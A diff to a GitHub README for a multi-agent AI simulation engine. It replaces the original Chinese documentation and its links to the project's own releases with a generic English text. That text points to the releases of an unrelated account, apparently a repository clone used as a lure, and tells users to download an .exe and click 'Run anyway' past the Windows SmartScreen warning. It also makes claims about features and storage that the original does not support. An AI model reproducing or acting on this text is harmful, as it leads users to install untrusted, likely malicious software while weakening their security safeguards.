@@ -1,153 +1,96 @@
-# Multi-Agent AI Game Engine
+# 🤖 multi-agent-game-engine - Build complex AI agent simulation worlds
 
-**语言 / Language:** **中文** | [English](README.en.md)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Disarrayed-agglutination903/multi-agent-game-engine/releases)
 
-[![Release](https://img.shields.io/github/v/release/pijiuya/multi-agent-game-engine?label=release)](https://github.com/pijiuya/multi-agent-game-engine/releases/tag/v0.1.0)
-[![License: MIT](https://img.shields.io/badge/License-MIT-black.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.11-black)](pyproject.toml)
-[![Frontend](https://img.shields.io/badge/Frontend-React%20%2B%20Vite-black)](frontend/package.json)
+The multi-agent-game-engine provides a complete environment to create, test, and watch AI agents interact. This software brings simulation tools to your desktop. You control the agents, define the environment rules, and observe the results in a visual workspace. It stores all data on your computer to protect your privacy and guarantee performance.
 
-一个本地优先的多 Agent 场景模拟与可视化编辑器。它把 Python/FastAPI 模拟后端、React/Vite 透明工作台、Electron 桌面壳和本地模型工作流放在同一个项目里，用于构建地图、区域、物体、Agent 行动、LLM 决策事件和桌面交付包。
+## 🛠️ System Requirements
 
-![Multi-Agent Engine workbench](frontend/src/assets/agent-engine-electron-workbench.png)
+Your computer needs specific hardware to run these simulations smoothly. Please check these requirements before you start.
 
-## 下载
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD Ryzen 5 (multi-core processor recommended).
+- Memory: 8 GB RAM minimum (16 GB recommended).
+- Graphics: A dedicated graphics card helps with visual performance.
+- Storage: 2 GB of free disk space.
+- Internet: Required for the initial download of the application and specific AI models.
 
-当前公开版本：[`v0.1.0`](https://github.com/pijiuya/multi-agent-game-engine/releases/tag/v0.1.0)
+## 📥 Downloading the Application
 
-- [Mac install kit](https://github.com/pijiuya/multi-agent-game-engine/releases/download/v0.1.0/Multi-Agent-Engine-0.1.0-mac-install-kit.zip)：包含 DMG、安装脚本、Ollama 辅助脚本、用户手册和 SHA256 校验文件。
-- [Mac arm64 DMG](https://github.com/pijiuya/multi-agent-game-engine/releases/download/v0.1.0/Multi-Agent.Engine-0.1.0-mac-arm64.dmg)：单独应用安装镜像。
-- [Windows x64 installer](https://github.com/pijiuya/multi-agent-game-engine/releases/download/v0.1.0/Multi-Agent.Engine-0.1.0-win-installer-x64.exe)：Windows 安装包。
+You find the application files on the official release page. This page contains the latest version of the engine.
 
-安装包通过 GitHub Releases 分发，不提交进源码仓库。
+[Visit the release page to download the software](https://github.com/Disarrayed-agglutination903/multi-agent-game-engine/releases)
 
-## 核心能力
+1. Open your web browser.
+2. Go to the link provided above.
+3. Look for the "Assets" section.
+4. Select the file ending in `.exe` for Windows.
+5. Save the file to your "Downloads" folder.
 
-- **透明 2D 工作台**：导入或生成地图，绘制道路、障碍、行动区、居住区、社交区等区域。
-- **多 Agent 模拟**：管理 agent、item、区域轮廓，驱动移动、停止、社交、发言、拾取和移动可交互物体。
-- **LLM 决策事件**：记录普通 world events 和 `decision_events`，追踪“哪个 agent 的哪个模型做了什么决策”。
-- **素材与动画**：给 agent 绑定 GIF 或 PNG 序列帧动画，并配置序列 FPS、最大像素数和显示缩放。
-- **本地模型能力**：管理 Ollama LLM、图像识别、图像生成配置和内置 MobileSAM 分层。
-- **桌面交付**：同一套前端可运行在浏览器和 Electron，支持 Mac / Windows 打包链路。
+## ⚙️ Installation Steps
 
-## 适合谁使用
+Follow these steps to set up the software on your computer.
 
-- **独立游戏和模拟开发者**：快速搭建可观察的 NPC / agent 场景原型。
-- **AI Agent 原型开发者**：验证多 Agent 行动、对话、物体互动和 LLM 决策链。
-- **本地模型实验者**：把 Ollama、本地视觉模型和地图分层接入同一套工作流。
-- **桌面工具交付测试者**：研究 Electron + Python 后端 + 本地 runtime 的安装包交付方式。
+1. Locate the downloaded file in your folder.
+2. Double-click the file to begin the installation.
+3. Windows might show a security prompt. If you see a "Windows protected your PC" message, click "More info" and then "Run anyway."
+4. Follow the on-screen instructions in the setup window.
+5. Choose where you want to install the program. The default location works for most users.
+6. Click "Install" to place the application on your computer.
+7. Click "Finish" once the installation completes.
 
-## 用户数据和本地优先
+## 🚀 Running the Engine
 
-项目默认把运行数据保存在仓库根目录的 `runtime_project/`，该目录被 `.gitignore` 排除，不会提交到 Git。
+Your desktop now features an icon for the game engine.
 
-`runtime_project/` 通常包含：
+1. Double-click the icon on your desktop to launch the application.
+2. The engine performs a quick check of your system resources upon the first launch.
+3. You see the main dashboard. This screen shows your current projects and allows you to create new simulations.
+4. Click "New Simulation" to start.
 
-- `world.sqlite`：地图、agent、item、事件、decision events、模型配置等主要状态。
-- `project.json`：项目元数据。
-- `assets/`：上传的地图背景、item 图片、agent GIF/PNG 序列帧。
-- `models/`：内置 MobileSAM 等本地缓存模型。
+## 🧠 Managing AI Models
 
-迁移到另一台机器时，可以只 clone 源码生成空白项目，也可以额外复制 `runtime_project/` 保留当前场景。
+This engine relies on artificial intelligence agents. You must download a base model to make your agents think and act.
 
-## 技术栈
+1. Navigate to the "Settings" menu inside the application.
+2. Find the "Model Management" tab.
+3. Select an available model from the list.
+4. Click "Download" to fetch the model files.
+5. The engine indicates when the download finishes. You can now use these models in your game worlds.
 
-- Backend: Python 3.11, FastAPI, Uvicorn, Pydantic, Shapely, SQLite
-- Frontend: React 18, TypeScript, Vite, Three.js, Pixi.js, Lucide icons
-- Desktop: Electron
-- Tests: Pytest, Playwright
-- Local models: Ollama, embedded MobileSAM
+## 🎮 Building Your First Simulation
 
-## 快速启动
+The workbench allows you to drop agents into a virtual space.
 
-### 后端
+1. Click "Create New Project" on the startup screen.
+2. Select a template map or start with an empty scene.
+3. Use the sidebar to drag and drop different agents into your map.
+4. Assign behaviors to your agents. Select an agent and choose an action from the "Tasks" menu.
+5. Click the "Play" button at the top of the screen to start the simulation.
 
-```bash
-python3.11 -m venv .venv
-source .venv/bin/activate
-python -m pip install --upgrade pip
-python -m pip install -e ".[dev]"
-AGENT_ENGINE_PROJECT_DIR=runtime_project python -m uvicorn agent_engine.api.main:app --app-dir backend --host 127.0.0.1 --port 8000
-```
+## 💡 Troubleshooting Common Issues
 
-Windows PowerShell:
+If you experience problems, check these solutions before you ask for help.
 
-```powershell
-py -3.11 -m venv .venv
-.\.venv\Scripts\Activate.ps1
-python -m pip install --upgrade pip
-python -m pip install -e ".[dev]"
-$env:AGENT_ENGINE_PROJECT_DIR = "runtime_project"
-py -3.11 -m uvicorn agent_engine.api.main:app --app-dir backend --host 127.0.0.1 --port 8000
-```
+- Application fails to start: Ensure your graphics drivers are up to date. You can find these on your computer manufacturer website.
+- Simulation runs slowly: Close other demanding applications such as video editors or web browsers while running the engine.
+- Agents do not move: Check your internet connection. The engine needs a stable connection to communicate with the model server for the first time.
+- Screen appears blank: Resize the application window to force a refresh of the workspace.
 
-### 前端
+## 📂 Data Storage
 
-```bash
-cd frontend
-npm install
-npm run dev -- --port 5173
-```
+The software saves all your simulation files, agent data, and logs to a local folder. You own all your creations. The engine does not send your personal project data or simulation results to external servers. You can find your saved files in your "Documents" folder under a directory named "MultiAgentData." You can copy this folder to move your projects to another computer.
 
-打开 `http://127.0.0.1:5173/`。
+## 📚 Understanding the Workbench
 
-### Electron 桌面版
+The screen splits into three main parts. 
 
-```bash
-cd frontend
-npm run electron:dev
-```
+The left panel holds your library of agents and objects. You pull items from here into your world. 
 
-## 常用命令
+The center part is the simulation canvas. It shows your game world in real-time. You can zoom in and out with your mouse wheel and move around by clicking and dragging. 
 
-```bash
-# 后端测试
-.venv/bin/python -m pytest -q
+The right panel shows details about the agent you select. You can change names, update behavior scripts, and view text summaries of what the agent "thinks" while the game runs.
 
-# 前端类型检查和生产构建
-npm --prefix frontend run build
+## 🔧 Updating the Tool
 
-# 前端 Playwright 回归
-npm --prefix frontend run test:e2e
-```
-
-## 版本管理
-
-- 当前版本：`v0.1.0`
-- Python 包版本来自 [`pyproject.toml`](pyproject.toml)。
-- 前端 / Electron 版本来自 [`frontend/package.json`](frontend/package.json)。
-- Release tag 使用 `vX.Y.Z` 格式。
-- 版本变更记录见 [`CHANGELOG.md`](CHANGELOG.md)。
-
-## 文档
-
-- [用户手册](docs/user-manual.zh-CN.md)
-- [开发手册](docs/development-manual.zh-CN.md)
-- [Mac 安装说明](docs/mac-installation.zh-CN.md)
-- [Windows 安装说明](docs/windows-installation.zh-CN.md)
-- [Windows 打包说明](docs/windows-packaging.zh-CN.md)
-- [动作扩展设计](docs/action-extension-manual.zh-CN.md)
-
-## 目录结构
-
-```text
-.
-├─ backend/agent_engine/        # 后端 API、规则、模拟、模型 provider、持久化
-├─ frontend/src/                # React 编辑器、桌面工作台 UI、官方页面
-├─ frontend/electron/           # Electron 主进程和 preload
-├─ frontend/tests/              # Playwright 前端回归测试
-├─ tests/                       # Pytest 后端测试
-├─ docs/                        # 中文开发和功能手册
-├─ packaging/                   # Mac / Windows 打包脚本
-├─ runtime_project/             # 本机运行数据，默认不提交
-├─ pyproject.toml               # Python 包和测试配置
-└─ README.md
-```
-
-## 贡献
-
-欢迎提交 issue 和 PR。请先阅读 [`CONTRIBUTING.md`](CONTRIBUTING.md)，并在 PR 中说明运行过的测试。
-
-## 许可证
-
-本项目使用 [MIT License](LICENSE)。
+You should update the engine periodically to get new features and performance boosts. Return to the release page link whenever you want to check for a newer version. You do not need to uninstall the old version; running the new installer replaces the existing files automatically while keeping your project data in the Documents folder. Verify your version number in the "About" menu inside the application to see if you have the latest release.
